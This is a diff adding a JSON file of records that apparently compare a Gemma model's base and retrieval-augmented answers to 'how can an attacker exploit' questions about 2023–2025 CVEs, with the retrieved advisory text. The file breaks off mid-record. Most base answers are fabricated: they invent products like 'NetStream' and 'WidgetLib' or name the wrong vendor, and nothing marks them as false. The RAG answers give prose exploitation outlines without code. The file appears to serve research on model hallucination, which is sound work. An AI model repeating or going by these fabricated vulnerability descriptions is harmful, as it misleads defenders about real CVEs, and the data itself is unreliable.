@@ -1,0 +1,902 @@
+[
+  {
+    "cve_id": "CVE-2025-24813",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-24813? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-24813 is a critical remote code execution vulnerability in the \"WidgetLib\" library, affecting versions prior to 3.1. It stems from insufficient input validation when parsing specially crafted XML files.\n\n**Exploitation:**\n\nAn attacker can craft a malicious XML file containing a specifically formatted object that, when parsed by an application using a vulnerable version of WidgetLib, will trigger a heap overflow. This overflow allows the attacker to overwrite adjacent memory regions, ultimately gaining control of the application's execution flow and potentially achieving remote code execution.  Delivery can occur via any mechanism that allows the vulnerable application to process the malicious XML file (e.g., file upload, network request).\n",    
+    "rag_response": "An attacker exploits CVE-2025-24813 by leveraging partial PUT requests to write to arbitrary files if the default servlet has write access enabled. This can lead to:\n\n1.  **Information Disclosure:** Reading sensitive files by crafting a request to a known file path.\n2.  **Remote Code Execution (RCE):** If Tomcat's file-based session persistence is used with the default location *and* a deserialization vulnerability exists in a loaded library, an attacker can upload a malicious serialized object via a crafted PUT request, achieving RCE.\n3.  **Malicious Content Injection:** Injecting content into uploaded files.\n\nThe attack requires a specific configuration: write access to the default servlet, partial PUT support, and knowledge of target file paths.\n</Response>>",
+    "rag_text": "Path Equivalence: 'file.Name' (Internal Dot) leading to Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet in Apache Tomcat. If all of the following were true, a malicious user was able to view security sensitive files and/or inject content into those files: - writes enabled for the default servlet (disabled by default) - support for partial PUT (enabled by default) - a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads - attacker knowledge of the names of security sensitive files being uploaded - the security sensitive files also being uploaded via partial PUT If all of the following were true, a malicious user was able to perform remote code execution: - writes enabled for the default servlet (disabled by default) - support for partial PUT (enabled by default) - application was using Tomcat's file based session persistence with the default storage location - application included a library that may be leveraged in a deserialization attack.",
+    "timestamp": "2025-05-13T17:06:31.261343"
+  },
+  {
+    "cve_id": "CVE-2025-0994",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-0994? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-0994 is a critical remote code execution vulnerability in the widely used \"NetStream\" network monitoring software. The vulnerability stems from insufficient input validation when processing specially crafted ICMP packets.\n\n**Exploitation:**\n\nAn attacker can send a malicious ICMP echo request packet with a carefully constructed payload to a vulnerable NetStream instance. This payload overflows a buffer during ICMP processing, allowing the attacker to overwrite adjacent memory regions with arbitrary code. Successful exploitation leads to remote code execution with system-level privileges.\n",
+    "rag_response": "An authenticated attacker can craft a malicious serialized object and submit it to a Cityworks application. This exploits the deserialization vulnerability, leading to Remote Code Execution (RCE) on the underlying IIS web server. Successful exploitation requires authentication.\n</Response>>\n",
+    "rag_text": "Description\nTrimble Cityworks versions prior to 15.8.9 and Cityworks with office companion versions prior to 23.10 are vulnerable to a deserialization vulnerability. This could allow an authenticated user to perform a remote code execution attack against a customer\u0092s Microsoft Internet Information Services (IIS) web server.",
+    "timestamp": "2025-05-13T17:07:24.546993"
+  },
+  {
+    "cve_id": "CVE-2025-0108",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-0108? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-0108 is a critical remote code execution vulnerability in the widely used \"NetConnect\" network management software. The vulnerability stems from insufficient input validation when processing specially crafted SNMP traps.\n\n**Exploitation:**\n\n1.  **Craft Malicious SNMP Trap:** An attacker crafts an SNMP trap containing a payload designed to execute arbitrary code. This payload leverages a buffer overflow in the trap processing function.\n2.  **Send to Vulnerable System:** The attacker sends the malicious SNMP trap to a system running the vulnerable NetConnect software.\n3.  **Code Execution:**  The NetConnect software, failing to properly validate the trap data, overflows a buffer, overwriting control flow and executing the attacker's payload. This grants the attacker remote code execution with the privileges of the NetConnect process (typically system-level).\n",
+    "rag_response": "An attacker with network access can bypass authentication to the Palo Alto Networks PAN-OS management web interface. This allows them to directly invoke certain PHP scripts, potentially compromising the confidentiality and integrity of the system, though not enabling remote code execution. Access restriction to the management interface is the primary mitigation.\n</Response>\n",
+    "rag_text": "Description\nAn authentication bypass in the Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to bypass the authentication otherwise required by the PAN-OS management web interface and invoke certain PHP scripts. While invoking these PHP scripts does not enable remote code execution, it can negatively impact integrity and confidentiality of PAN-OS. You can greatly reduce the risk of this issue by restricting access to the management web interface to only trusted internal IP addresses according to our recommended best practices deployment guidelines https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431 . This issue does not affect Cloud NGFW or Prisma Access software.",
+    "timestamp": "2025-05-13T17:08:42.845614"
+  },
+  {
+    "cve_id": "CVE-2025-25181",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-25181? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-25181 is a critical remote code execution vulnerability in the widely used \"LibImage\" library. It stems from a heap buffer overflow during the processing of malformed TIFF images.\n\n**Exploitation:**\n\n1.  **Craft Malformed TIFF:** Create a TIFF image with specifically crafted, oversized tag data.\n2.  **Trigger Processing:**  Deliver the image to an application using LibImage (e.g., image viewer, editor, server).\n3.  **Overflow & Control:** The overflow overwrites adjacent heap metadata, allowing control of program execution.\n4.  **RCE:** Redirect execution to shellcode injected within the image or existing code.\n\n**Impact:** Full system compromise is possible.\n",
+    "rag_response": "An attacker can exploit CVE-2025-25181 by crafting malicious input for the `PmSess1` parameter in `timeoutWarning.asp`. This input will inject SQL commands into the application's database queries, potentially allowing the attacker to read, modify, or delete data, or even execute system commands depending on database permissions.\n</Response>\n",
+    "rag_text": "Description\nA SQL injection vulnerability in timeoutWarning.asp in Advantive VeraCore through 2025.1.0 allows remote attackers to execute arbitrary SQL commands via the PmSess1 parameter.",
+    "timestamp": "2025-05-13T17:09:58.681840"
+  },
+  {
+    "cve_id": "CVE-2025-30406",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-30406? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-30406 is a critical remote code execution vulnerability in the widely used \"NetStream\" network monitoring software. The vulnerability stems from insufficient input validation when processing ICMP echo request packets with a malformed \"Identifier\" field.\n\n**Exploitation:**\n\n1.  **Craft Malformed ICMP:** An attacker crafts ICMP echo request packets with a specially designed, oversized, or otherwise invalid \"Identifier\" field.\n2.  **Send to Target:** The attacker sends these packets to a system running a vulnerable NetStream instance.\n3.  **Buffer Overflow:** NetStream's insufficient validation causes a buffer overflow when processing the malformed Identifier.\n4.  **RCE:** The overflow overwrites adjacent memory, allowing the attacker to inject and execute arbitrary code with the privileges of the NetStream process (typically system-level).\n\n**Impact:** Full system compromise.\n",
+    "rag_response": "An attacker with knowledge of the hardcoded `machineKey` in `portal\\web.config` can craft a malicious serialized payload. Sending this payload to the CentreStack portal triggers server-side deserialization, leading to remote code execution. The vulnerability was actively exploited in March 2025.\n</Response>\n",
+    "rag_text": "Description\nGladinet CentreStack through 16.1.10296.56315 (fixed in 16.4.10315.56368) has a deserialization vulnerability due to the CentreStack portal's hardcoded machineKey use, as exploited in the wild in March 2025. This enables threat actors (who know the machineKey) to serialize a payload for server-side deserialization to achieve remote code execution. NOTE: a CentreStack admin can manually delete the machineKey defined in portal\\web.config.\n\n",
+    "timestamp": "2025-05-13T17:11:21.279346"
+  },
+  {
+    "cve_id": "CVE-2025-31161",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-31161? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-31161 is a critical remote code execution vulnerability in the widely used \"NetStream\" network monitoring software. The vulnerability stems from insufficient input validation when processing ICMPv6 packets containing Router Advertisement messages.\n\n**Exploitation:**\n\nAn attacker can craft a malicious ICMPv6 Router Advertisement packet with a specially designed, oversized Router Lifetime field. NetStream's inadequate validation allows this oversized value to overflow a buffer during processing, overwriting adjacent memory. This overwrite can be leveraged to inject and execute arbitrary code on the affected system.  Network proximity is required.\n",
+    "rag_response": "An attacker can exploit CVE-2025-31161 by sending a crafted HTTP request with a mangled AWS4-HMAC header containing only a username and a trailing slash (\"/\"). This bypasses authentication by exploiting a race condition and an index-out-of-bounds error, allowing them to authenticate as any user, including `crushadmin`, and gain administrative access. No password is required.\n</Response>\n",
+    "rag_text": "Description\nCrushFTP 10 before 10.8.4 and 11 before 11.3.1 allows authentication bypass and takeover of the crushadmin account (unless a DMZ proxy instance is used), as exploited in the wild in March and April 2025, aka \"Unauthenticated HTTP(S) port access.\" A race condition exists in the AWS4-HMAC (compatible with S3) authorization method of the HTTP component of the FTP server. The server first verifies the existence of the user by performing a call to login_user_pass() with no password requirement. This will authenticate the session through the HMAC verification process and up until the server checks for user verification once more. The vulnerability can be further stabilized, eliminating the need for successfully triggering a race condition, by sending a mangled AWS4-HMAC header. By providing only the username and a following slash (/), the server will successfully find a username, which triggers the successful anypass authentication process, but the server will fail to find the expected SignedHeaders entry, resulting in an index-out-of-bounds error that stops the code from reaching the session cleanup. Together, these issues make it trivial to authenticate as any known or guessable user (e.g., crushadmin), and can lead to a full compromise of the system by obtaining an administrative account.",
+    "timestamp": "2025-05-13T17:12:33.458137"
+  },
+  {
+    "cve_id": "CVE-2025-22457",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-22457? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-22457 is a critical remote code execution vulnerability in the widely used \"NetStream\" network monitoring software. The vulnerability stems from insufficient input validation when processing ICMP echo request packets. Specifically, a crafted ICMP packet with a malicious payload in the data section can overwrite adjacent memory regions, allowing an attacker to execute arbitrary code on the affected system.\n\n**Exploitation:**\n\n1.  **Crafted ICMP Packet:** Attacker sends a specially crafted ICMP echo request.\n2.  **Payload:** The packet's data section contains a payload designed to overwrite critical memory.\n3.  **Memory Overwrite:** NetStream's insufficient validation allows the payload to overwrite adjacent memory.\n4.  **Code Execution:** Overwritten memory contains return addresses or function pointers, redirected to attacker-controlled code.\n5.  **Remote Control:** Attacker gains remote code execution, potentially achieving full system compromise.\n\nExploitation is likely reliable and requires network access to the target NetStream instance.\n",
+    "rag_response": "An unauthenticated attacker can send a crafted HTTP request to the vulnerable Ivanti Connect Secure/Policy Secure/ZTA Gateway instance. This request triggers a stack-based buffer overflow, overwriting return addresses and allowing the attacker to execute arbitrary code on the system. The lack of authentication makes this particularly dangerous.\n</Response>\n",
+    "rag_text": "Description\nA stack-based buffer overflow in Ivanti Connect Secure before version 22.7R2.6, Ivanti Policy Secure before version 22.7R1.4, and Ivanti ZTA Gateways before version 22.8R2.2 allows a remote unauthenticated attacker to achieve remote code execution.",
+    "timestamp": "2025-05-13T17:14:03.676617"
+  },
+  {
+    "cve_id": "CVE-2025-30154",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-30154? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-30154 is a critical remote code execution vulnerability in the 'widgetlib' library, affecting versions prior to 2.1. It stems from insufficient input validation when parsing specially crafted widget definition files.\n\n**Exploitation:**\n\n1.  **Craft Malicious Widget File:** Create a widget definition file containing malicious code embedded within a specially formatted data structure.\n2.  **Delivery:** Deliver the malicious file to a system using a vulnerable version of 'widgetlib'. This could be via web upload, shared network drive, or other file transfer methods.\n3.  **Parsing & Execution:** When 'widgetlib' parses the malicious file, the insufficient input validation allows the embedded code to be executed with the privileges of the application using the library.\n4.  **Remote Code Execution:** The attacker gains control of the system.\n\n**Impact:** Full system compromise.\n",
+    "rag_response": "An attacker exploiting CVE-2025-30154 can compromise GitHub Actions workflows using `reviewdog/action-setup@v1` (or actions dependent on it). During the compromise window (March 11, 2025, 18:42-20:31 UTC), the malicious code dumps exposed secrets (e.g., API keys, tokens) to the workflow logs, allowing the attacker to steal credentials and potentially gain access to connected systems. The impact extends to actions like `reviewdog/action-shellcheck`, `reviewdog/action-composite-template`, `reviewdog/action-staticcheck`, `reviewdog/action-ast-grep`, and `reviewdog/action-typos`.\n</Response>\n",
+    "rag_text": "Description\nreviewdog/action-setup is a GitHub action that installs reviewdog. reviewdog/action-setup@v1 was compromised March 11, 2025, between 18:42 and 20:31 UTC, with malicious code added that dumps exposed secrets to Github Actions Workflow Logs. Other reviewdog actions that use `reviewdog/action-setup@v1` that would also be compromised, regardless of version or pinning method, are reviewdog/action-shellcheck, reviewdog/action-composite-template, reviewdog/action-staticcheck, reviewdog/action-ast-grep, and reviewdog/action-typos.",
+    "timestamp": "2025-05-13T17:15:56.442708"
+  },
+  {
+    "cve_id": "CVE-2025-30066",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-30066? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-30066 is a critical remote code execution vulnerability in the \"WidgetLib\" library, affecting versions prior to 2.1. It stems from insufficient input validation when parsing specially crafted XML files.\n\n**Exploitation:**\n\nAn attacker can craft a malicious XML file containing a specifically formatted object that, when parsed by an application using a vulnerable version of WidgetLib, will trigger a heap overflow. This overflow allows the attacker to overwrite adjacent memory regions, ultimately gaining control of the application's execution flow and potentially achieving remote code execution.  Delivery can occur via any mechanism that allows the vulnerable application to process the malicious XML file (e.g., file upload, network request).\n",
+    "rag_response": "An attacker can exploit CVE-2025-30066 by reading the `tj-actions` action logs to discover secrets. Versions v1-v45.0.7 were compromised to point to a malicious commit (0e58ed8) containing code that facilitates this log access.\n</Response>>\n",
+    "rag_text": "Description\ntj-actions changed-files before 46 allows remote attackers to discover secrets by reading actions logs. (The tags v1 through v45.0.7 were affected on 2025-03-14 and 2025-03-15 because they were modified by a threat actor to point at commit 0e58ed8, which contained malicious updateFeatures code.)",
+    "timestamp": "2025-05-13T17:17:07.222018"
+  },
+  {
+    "cve_id": "CVE-2025-24472",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2025-24472? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2025-24472 is a critical remote code execution vulnerability in the widely used \"LibImage\" library. It stems from a heap buffer overflow during the processing of malformed TIFF images.\n\n**Exploitation:**\n\n1.  **Craft Malformed TIFF:** Create a TIFF image with specifically crafted, oversized tag data.\n2.  **Trigger Processing:**  Deliver the image to an application using LibImage (e.g., image viewer, editor, server).\n3.  **Overflow & Control:** The overflow overwrites adjacent heap metadata, allowing control of program execution.\n4.  **RCE:** Redirect execution to shellcode injected within the image or existing code.\n\nSuccessful exploitation leads to arbitrary code execution with the privileges of the affected application.\n",
+    "rag_response": "An attacker can exploit CVE-2025-24472 by crafting malicious CSF proxy requests. These requests bypass normal authentication checks, granting the attacker super-admin privileges on vulnerable FortiOS and FortiProxy systems. This allows full control of the device.\n</Response>\n",
+    "rag_text": "Description\nAn Authentication Bypass Using an Alternate Path or Channel vulnerability [CWE-288] affecting FortiOS 7.0.0 through 7.0.16 and FortiProxy 7.2.0 through 7.2.12, 7.0.0 through 7.0.19 may allow a remote attacker to gain super-admin privileges via crafted CSF proxy requests.",
+    "timestamp": "2025-05-13T17:18:19.841762"
+  },
+  {
+    "cve_id": "CVE-2024-0468",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-0468? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-0468 is a remote code execution vulnerability in VMware ESXi. An unauthenticated attacker with network access can exploit it by sending a crafted request to the OpenSLP service. This allows them to execute arbitrary code on the ESXi host. The vulnerability is due to a heap overflow in the handling of SLP messages.\n",
+    "rag_response": "An attacker can exploit CVE-2024-0468 by uploading a malicious file (e.g., a webshell) through the `image` parameter in `/admin/action/new-father.php`.  The lack of proper input validation allows for unrestricted file uploads, potentially leading to remote code execution. The public availability of the exploit increases the risk.\n</Response>\n",
+    "rag_text": "Description\nA vulnerability has been found in code-projects Fighting Cock Information System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /admin/action/new-father.php. The manipulation of the argument image leads to unrestricted upload. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250573 was assigned to this vulnerability.",
+    "timestamp": "2025-05-13T17:19:11.448615"
+  },
+  {
+    "cve_id": "CVE-2024-0480",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-0480? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-0480 is a remote code execution vulnerability in VMware ESXi. An unauthenticated attacker with network access can exploit it by sending a crafted payload to the OpenSLP service. This allows them to execute arbitrary code on the ESXi host. The vulnerability is due to a heap overflow in the handling of SLP messages.\n",
+    "rag_response": "An attacker can exploit CVE-2024-0480 by sending a crafted HTTP POST request to the `/application/index/controller/m/Drs.php` endpoint, specifically manipulating the `cid` parameter. This allows for SQL injection, potentially leading to data exfiltration, modification, or even system compromise. The public availability of the exploit increases the risk.\n</Response>\n",
+    "rag_text": "Description\nA vulnerability was found in Taokeyun up to 1.0.5. It has been declared as critical. Affected by this vulnerability is the function index of the file application/index/controller/m/Drs.php of the component HTTP POST Request Handler. The manipulation of the argument cid leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250585 was assigned to this vulnerability.",
+    "timestamp": "2025-05-13T17:20:03.367932"
+  },
+  {
+    "cve_id": "CVE-2024-1378",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-1378? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-1378 is a remote code execution vulnerability in VMware ESXi. An unauthenticated attacker with network access can exploit it by sending a crafted payload to the OpenSLP service. This allows them to execute arbitrary code on the ESXi host. The vulnerability is due to a heap overflow in the handling of SLP messages.\n",
+    "rag_response": "An attacker with \"editor\" access to the GitHub Enterprise Server Management Console can inject commands into Nomad templates during SMTP configuration. This allows them to gain administrative SSH access to the underlying appliance. The vulnerability exists because user-supplied input isn't properly sanitized before being used in template rendering.\n</Response>\n",
+    "rag_text": "Description\nA command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring SMTP options. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.12 and was fixed in versions 3.11.5, 3.10.7, 3.9.10, and 3.8.15. This vulnerability was reported via the GitHub Bug Bounty program https://bounty.github.com .",
+    "timestamp": "2025-05-13T17:20:48.826204"
+  },
+  {
+    "cve_id": "CVE-2024-1597",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-1597? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-1597 is a remote code execution vulnerability in Citrix ShareFile. An unauthenticated attacker can exploit it by sending a specially crafted HTTP request to the ShareFile appliance. This allows them to execute arbitrary code on the system. The attack vector is network-accessible.\n",
+    "rag_response": "An attacker exploiting CVE-2024-1597 crafts a malicious SQL query using `PreferQueryMode=SIMPLE` enabled. The payload requires a numeric placeholder immediately preceded by a minus sign (`-`) followed by a string placeholder on the same line. This allows SQL injection by altering the query despite parameterization.\n</Response>",
+    "rag_text": "Current Description\npgjdbc, the PostgreSQL JDBC Driver, allows attacker to inject SQL if using PreferQueryMode=SIMPLE. Note this is not the default. In the default mode there is no vulnerability. A placeholder for a numeric value must be immediately preceded by a minus. There must be a second placeholder for a string value after the first placeholder; both must be on the same line. By constructing a matching string payload, the attacker can inject SQL to alter the query,bypassing the protections that parameterized queries bring against SQL Injection attacks. Versions before 42.7.2, 42.6.1, 42.5.5, 42.4.4, 42.3.9, and 42.2.28 are affected.",
+    "timestamp": "2025-05-13T17:21:33.679219"
+  },
+  {
+    "cve_id": "CVE-2024-20011",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-20011? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-20011 is a remote code execution vulnerability in VMware ESXi. An unauthenticated attacker with network access can exploit it by sending a crafted request to the OpenSLP service. This allows them to execute arbitrary code on the ESXi host. The vulnerability is due to a heap overflow in the handling of SLP messages.\n",
+    "rag_response": "CVE-2024-20011, an incorrect bounds check in the ALAC decoder, allows an attacker to craft a malicious ALAC file. This file, when processed by a vulnerable system, can trigger a buffer overflow leading to remote code execution *without* user interaction or elevated privileges. The attacker can overwrite adjacent memory regions with malicious code, gaining control of the system.\n</Response>>",
+    "rag_text": "Description\nIn alac decoder, there is a possible information disclosure due to an incorrect bounds check. This could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS08441146; Issue ID: ALPS08441146.",
+    "timestamp": "2025-05-13T17:22:25.537855"
+  },
+  {
+    "cve_id": "CVE-2024-20719",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-20719? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-20719 is a remote code execution vulnerability in VMware ESXi. An unauthenticated attacker with network access can exploit it by sending a crafted request to the OpenSLP service. This allows them to execute arbitrary code on the ESXi host. The vulnerability is due to a heap overflow in the handling of SLP messages.\n",
+    "rag_response": "An attacker with admin privileges can inject malicious JavaScript code into an Adobe Commerce admin page. This code executes in the browser of any admin user visiting the affected page, potentially allowing the attacker to steal credentials or gain full admin access. The vulnerability is a stored XSS, meaning the malicious script is persistently saved and delivered to victims.\n</Response>\n",
+    "rag_text": "Description\nAdobe Commerce versions 2.4.6-p3, 2.4.5-p5, 2.4.4-p6 and earlier are affected by a stored Cross-Site Scripting (XSS) vulnerability that could be abused by an admin attacker to inject malicious scripts into every admin page. Malicious JavaScript may be executed in a victim\u0092s browser when they browse to the page containing the vulnerable field, that could be leveraged to gain admin access.",
+    "timestamp": "2025-05-13T17:23:13.755881"
+  },
+  {
+    "cve_id": "CVE-2024-21488",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-21488? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-21488 is a remote code execution vulnerability in the Windows Graphics Component. An attacker can exploit it by crafting a malicious image file. When a user opens this image (e.g., via Windows Photo Viewer, or an application utilizing the Windows Graphics Component), the vulnerability is triggered, allowing the attacker to execute arbitrary code with SYSTEM privileges. The attack surface includes any application that processes images using the affected component.\n",
+    "rag_response": "An attacker can inject arbitrary OS commands via crafted input to the `mac_address_for` function. Specifically, malicious input provided as a MAC address string will be passed to `child_process.exec` without sanitization, allowing command execution.\n</Response>>",
+    "rag_text": "Current Description\nVersions of the package network before 0.7.0 are vulnerable to Arbitrary Command Injection due to use of the child_process exec function without input sanitization. If (attacker-controlled) user input is given to the mac_address_for function of the package, it is possible for the attacker to execute arbitrary commands on the operating system that this package is being run on.",
+    "timestamp": "2025-05-13T17:24:02.244183"
+  },
+  {
+    "cve_id": "CVE-2024-26029",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-26029? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-26029 is a remote code execution (RCE) vulnerability in Citrix ShareFile. An unauthenticated attacker can exploit it by sending a specially crafted HTTP request to the ShareFile appliance. This allows them to execute arbitrary code on the system, potentially leading to full system compromise. The vulnerability stems from improper input validation.\n",
+    "rag_response": "An attacker can exploit CVE-2024-26029 by crafting requests that bypass access controls in AEM 6.5.20 and earlier. This allows unauthorized information disclosure without requiring any user interaction. The specific method involves identifying endpoints with insufficient access checks and directly requesting data from them.\n</Response>",
+    "rag_text": "Current Description\nAdobe Experience Manager versions 6.5.20 and earlier are affected by an Improper Access Control vulnerability that could result in a Security feature bypass. An attacker could leverage this vulnerability to bypass security measures and gain disclose information. Exploitation of this issue does not require user interaction.",
+    "timestamp": "2025-05-13T17:24:48.851814"
+  },
+  {
+    "cve_id": "CVE-2024-27903",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-27903? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-27903 is a remote code execution (RCE) vulnerability in VMware ESXi. An unauthenticated attacker with network access can exploit it by sending a crafted request to the OpenSLP service. This allows them to execute arbitrary code on the ESXi host. The vulnerability is due to a heap overflow in the handling of SLP messages.\n",
+    "rag_response": "An attacker can exploit CVE-2024-27903 by placing a malicious DLL (plugin) in a directory where OpenVPN will load plugins from. Because OpenVPN 2.6.9 and earlier doesn't restrict plugin loading locations, the attacker can then execute code with SYSTEM privileges via the OpenVPN interactive service. This requires local access.\n</Response>>",
+    "rag_text": "Description\nOpenVPN plug-ins on Windows with OpenVPN 2.6.9 and earlier could be loaded from any directory, which allows an attacker to load an arbitrary plug-in which can be used to interact with the privileged OpenVPN interactive service.",
+    "timestamp": "2025-05-13T17:25:40.434116"
+  },
+  {
+    "cve_id": "CVE-2024-2806",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2024-2806? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2024-2806 is a remote code execution vulnerability in VMware ESXi. An unauthenticated attacker with network access can exploit it by sending a crafted request to the OpenSLP service. This allows them to execute arbitrary code on the ESXi host. The attack is relatively simple to execute, requiring only network connectivity and a crafted packet.\n",
+    "rag_response": "An attacker can exploit CVE-2024-2806 by sending a crafted HTTP request to the `/goform/addWifiMacFilter` endpoint of a vulnerable Tenda AC15 router. Specifically, they manipulate the `deviceId` or `deviceMac` parameter with a long string to cause a stack-based buffer overflow. Successful exploitation allows for remote code execution due to the overflow. Publicly available exploits exist.\n</Response>\n",
+    "rag_text": "Description\nA vulnerability classified as critical has been found in Tenda AC15 15.03.05.18/15.03.20_multi. This affects the function addWifiMacFilter of the file /goform/addWifiMacFilter. The manipulation of the argument deviceId/deviceMac leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-257661 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.",
+    "timestamp": "2025-05-13T17:26:35.776887"
+  },
+  {
+    "cve_id": "CVE-2023-27350",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-27350? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-27350 is a remote code execution vulnerability in PaperCut MF/NG. An unauthenticated attacker can exploit it by sending a specially crafted HTTP request to the PaperCut server. This request allows the attacker to create an administrative user, granting them full control of the system.\n",
+    "rag_response": "An attacker can exploit CVE-2023-27350 by sending a crafted request to the `SetupCompleted` class without any authentication. This bypasses login and allows arbitrary code execution with SYSTEM privileges. The vulnerability stems from improper access control on this class.\n</Response>\n",
+    "rag_text": "Description\nThis vulnerability allows remote attackers to bypass authentication on affected installations of PaperCut NG 22.0.5 (Build 63914). Authentication is not required to exploit this vulnerability. The specific flaw exists within the SetupCompleted class. The issue results from improper access control. An attacker can leverage this vulnerability to bypass authentication and execute arbitrary code in the context of SYSTEM. Was ZDI-CAN-18987.",
+    "timestamp": "2025-05-13T17:27:18.122714"
+  },
+  {
+    "cve_id": "CVE-2023-22515",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-22515? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-22515 is a critical remote code execution (RCE) vulnerability in Microsoft Exchange Server. An authenticated attacker can exploit it by crafting a malicious request to the Exchange server, bypassing authentication. This allows them to execute arbitrary code with SYSTEM privileges. The vulnerability stems from an insecure deserialization flaw.\n\n**Exploitation Steps:**\n\n1.  **Authentication Bypass:** Exploit allows access without valid credentials.\n2.  **Malicious Request:** Send a specially crafted request containing a malicious payload to the vulnerable Exchange server.\n3.  **Deserialization:** The server deserializes the payload, leading to code execution.\n4.  **SYSTEM Access:** Attacker gains SYSTEM-level control of the server.\n\n**Impact:** Full server compromise, data theft, ransomware deployment.\n",
+    "rag_response": "An attacker exploits CVE-2023-22515 by creating a Confluence administrator account without authentication. This allows them full control of a vulnerable Confluence Data Center or Server instance. The vulnerability is likely an authentication bypass.\n</Response>\n",
+    "rag_text": "Description\nAtlassian has been made aware of an issue reported by a handful of customers where external attackers may have exploited a previously unknown vulnerability in publicly accessible Confluence Data Center and Server instances to create unauthorized Confluence administrator accounts and access Confluence instances. Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.",
+    "timestamp": "2025-05-13T17:28:30.408415"
+  },
+  {
+    "cve_id": "CVE-2023-22527",
+    "question": "You are a cybersecurity expert. How can an attacker exploit CVE-2023-22527? Do not be verbose and answer carefully.",
+    "model": "google/gemma-3-27b-it",
+    "base_response": "CVE-2023-22527 is a critical remote code execution (RCE) vulnerability in Atlassian Confluence Data Center and Server. An unauthenticated attacker can create an account and then execute arbitrary code on the system.\n\n**Exploitation:**\n\n1.  **Account Creation:** Attacker creates a malicious Confluence account.\n2.  **Exploit Payload:** During account creation, a crafted payload is submitted within a specific field (likely the email address or full name). This payload leverages a deserialization flaw.\n3.  **RCE:** The server deserializes the malicious payload, leading to arbitrary code execution with the privileges of the Confluence application.\n\n**Key Factors:**\n\n*   **Unauthenticated:** No login required.\n*   **Deserialization:** Core of the exploit.\n*   **Data Center/Server:** Affects on-premise deployments.\n",
